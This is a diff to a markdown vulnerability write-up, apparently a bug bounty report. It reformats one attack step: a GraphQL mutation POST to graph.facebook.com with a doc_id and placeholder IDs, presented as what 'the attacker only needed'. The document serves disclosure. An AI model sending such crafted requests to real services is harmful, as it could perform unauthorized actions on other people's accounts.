@@ -34,19 +34,11 @@ The attacker only needed:
 4. **Submit Mutation:**
 
 ### 📤 Request
-```http
-POST v14.0/graphql
+```
+POST https://graph.facebook.com/v14.0/graphql
 
 doc_id=5822628081097871
-variables={
-  "input": {
-    "client_mutation_id": "9",
-    "actor_id": "0",
-    "brand_ig_fbid": "{XXX}",
-    "business_id": "{AAA}",
-    "creator_ig_fbid": "{ID_creator}"
-  }
-}
+variables={"input": {"client_mutation_id": "9","actor_id": "0","brand_ig_fbid": "{XXX}","business_id": "{AAA}","creator_ig_fbid": "{ID_creator}"}}
 ```
 
 ### ✅ Response (example)
